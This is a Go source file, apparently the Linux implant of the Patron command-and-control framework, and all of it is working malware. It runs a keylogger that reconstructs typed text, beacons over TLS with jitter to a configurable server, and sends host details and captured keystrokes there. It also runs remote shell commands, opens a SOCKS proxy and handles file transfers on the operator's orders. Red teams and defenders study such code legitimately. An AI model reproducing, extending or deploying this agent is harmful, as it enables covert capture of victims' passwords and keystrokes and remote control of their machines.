package main

import (
	"crypto/tls"
	"encoding/gob"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/PatronC2/Patron/client/client_utils"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/linux-keylogger-1/keylogger"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
	LoggingEnabled    string
	cache             string
	activeProxy       *client_utils.ProxyServer
)

func main() {
	client_utils.Initialize(LoggingEnabled)
	config, err := client_utils.LoadCertificate(RootCert)
	if err != nil {
		log.Fatalf("Failed to load certificate: %v\n", err)
	}

	keyboard := keylogger.FindKeyboardDevice()
	k, err := keylogger.New(keyboard)
	if err != nil {
		logger.Logf(logger.Error, "Error starting keylogger: %v", err)
		return
	}
	logger.Logf(logger.Debug, "Started keylogger")
	defer k.Close()

	events := k.Read()

	shiftActive := false
	capsLockActive := false

	shiftMappings := map[string]string{
		"1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
		"6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
		"-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
		";": ":", "'": "\"", ",": "<", ".": ">", "/": "?",
		"`": "~",
	}

	go func() {
		for e := range events {
			switch e.Type {
			case keylogger.EvKey:
				keyStr := e.KeyString()
				if keyStr == "L_SHIFT" || keyStr == "R_SHIFT" {
					shiftActive = e.KeyPress()
					continue
				}
				if keyStr == "CAPS_LOCK" && e.KeyPress() {
					capsLockActive = !capsLockActive
					continue
				}
				if e.KeyPress() {
					switch keyStr {
					case "SPACE":
						cache += (" ")
					case "ENTER":
						cache += ("\n")
					case "TAB":
						cache += ("\t")
					case "BS", "BACKSPACE":
						if len(cache) > 0 {
							cache = cache[:len(cache)-1]
						}
					default:
						if shiftActive && shiftMappings[keyStr] != "" {
							keyStr = shiftMappings[keyStr]
						} else if len(keyStr) == 1 && keyStr >= "a" && keyStr <= "z" {
							if (shiftActive && !capsLockActive) || (!shiftActive && capsLockActive) {
								keyStr = strings.ToUpper(keyStr)
							} else {
								keyStr = strings.ToLower(keyStr)
							}
						}
						cache += (keyStr)
					}
				}
			}
		}
	}()

	agentID, hostname, username := client_utils.GenerateAgentMetadata()
	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()

	for {
		beacon, encoder, decoder, err := client_utils.EstablishConnection(config, ServerIP, ServerPort)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := client_utils.GetLocalIP(beacon)
		if err := handleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory); err != nil {
			client_utils.HandleError(beacon, "configuration", err)
			continue
		}

		if err := client_utils.HandleFileRequest(beacon, encoder, decoder, agentID); err != nil {
			client_utils.HandleError(beacon, "file", err)
			continue
		}

		if err := handleCommandRequest(beacon, encoder, decoder, agentID); err != nil {
			client_utils.HandleError(beacon, "command", err)
			continue
		}

		if err := handleKeysRequest(beacon, encoder, decoder, agentID); err != nil {
			client_utils.HandleError(beacon, "keylogs", err)
			continue
		}

		beacon.Close()
		logger.Logf(logger.Info, "Beacon successful")
		time.Sleep(time.Second * time.Duration(client_utils.CalculateSleepInterval(CallbackFrequency, CallbackJitter)))
	}
}

func handleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory string) error {
	configReq := createConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip)
	if err := client_utils.SendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
		return err
	}

	var response types.Response
	if err := decoder.Decode(&response); err != nil {
		return err
	}

	if response.Type == types.ConfigurationResponseType {
		if configResponse, ok := response.Payload.(types.ConfigurationResponse); ok {
			updateClientConfig(configResponse)
		} else {
			return fmt.Errorf("unexpected payload type")
		}
	} else {
		return fmt.Errorf("unexpected response type: %v", response.Type)
	}
	return nil
}

func createConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip string) types.ConfigurationRequest {
	return types.ConfigurationRequest{
		AgentID:           agentID,
		Username:          username,
		Hostname:          hostname,
		OSType:            osType,
		OSArch:            osArch,
		OSBuild:           osVersion,
		CPUS:              cpus,
		MEMORY:            memory,
		AgentIP:           ip,
		ServerIP:          ServerIP,
		ServerPort:        ServerPort,
		CallbackFrequency: CallbackFrequency,
		CallbackJitter:    CallbackJitter,
		MasterKey:         "MASTERKEY",
	}
}

func updateClientConfig(config types.ConfigurationResponse) {
	updateConfigField(&ServerIP, config.ServerIP, "callback IP")
	updateConfigField(&ServerPort, config.ServerPort, "callback port")
	updateConfigField(&CallbackFrequency, config.CallbackFrequency, "callback frequency")
	updateConfigField(&CallbackJitter, config.CallbackJitter, "callback jitter")
}

func updateConfigField(current *string, new, fieldName string) {
	if *current != new {
		logger.Logf(logger.Info, "Updating %s", fieldName)
		*current = new
	}
}

func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
	logger.Logf(logger.Info, "Fetching commands to run")

	for {
		if err := client_utils.SendRequest(encoder, types.CommandRequestType, types.CommandRequest{AgentID: agentID}); err != nil {
			return err
		}
		var response types.Response
		if err := decoder.Decode(&response); err != nil {
			return fmt.Errorf("error decoding command response: %v", err)
		}
		if response.Type == types.CommandResponseType {
			if commandResponse, ok := response.Payload.(types.CommandResponse); ok {
				logger.Logf(logger.Debug, "commandType: %v", commandResponse.CommandType)
				if commandResponse.CommandType == "socks" {
					err := client_utils.HandleSocksCommand(beacon, encoder, commandResponse, &activeProxy)
					if err != nil {
						logger.Logf(logger.Error, "Error handling SOCKS5 command: %v", err)
						return err
					}
				} else {
					commandResult := executeAndReportCommand(beacon, encoder, commandResponse)
					if commandResult.CommandResult == "2" {
						goto Exit
					}
				}
			} else {
				return fmt.Errorf("unexpected payload type for CommandResponse")
			}
		} else {
			return fmt.Errorf("unexpected response type: %v, expected CommandResponseType", response.Type)
		}
		if err := decoder.Decode(&response); err != nil {
			return fmt.Errorf("error decoding command status response: %v", err)
		}
		if response.Type == types.CommandStatusResponseType {
			if commandStatusResponse, ok := response.Payload.(types.CommandStatusResponse); ok {
				logger.Logf(logger.Info, "Server received command success message: %v", commandStatusResponse)
			} else {
				return fmt.Errorf("unexpected payload type for CommandStatusResponse")
			}
		} else {
			return fmt.Errorf("unexpected response type: %v, expected CommandStatusResponseType", response.Type)
		}
	}
Exit:
	return nil
}

func executeAndReportCommand(beacon *tls.Conn, encoder *gob.Encoder, instruct types.CommandResponse) types.CommandStatusRequest {
	commandResult := executeCommandRequest(&instruct)
	client_utils.SendRequest(encoder, types.CommandStatusRequestType, commandResult)
	return commandResult
}

func executeCommandRequest(instruct *types.CommandResponse) types.CommandStatusRequest {
	if instruct.Command == "" && instruct.CommandType == "" {
		logger.Logf(logger.Info, "No command to execute.")
		return types.CommandStatusRequest{CommandResult: "2"}
	}

	var CmdOut, result string
	switch instruct.CommandType {
	case "shell":
		CmdOut, result = client_utils.RunShellCommand(instruct.Command), "1"
	case "kill":
		CmdOut, result = "~Killed~", "1"
	default:
		result = "2"
	}

	return types.CommandStatusRequest{
		AgentID:       instruct.AgentID,
		CommandID:     instruct.CommandID,
		CommandResult: result,
		CommandOutput: CmdOut,
	}
}

func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
	logger.Logf(logger.Info, "Sending keylogs: %v", cache)
	keyResponse := types.KeysRequest{
		AgentID: agentID,
		Keys:    cache,
	}

	if err := client_utils.SendRequest(encoder, types.KeysRequestType, keyResponse); err != nil {
		return err
	}
	var response types.Response
	if err := decoder.Decode(&response); err != nil {
		return fmt.Errorf("error decoding command response: %v", err)
	}
	cache = ""

	return nil
}
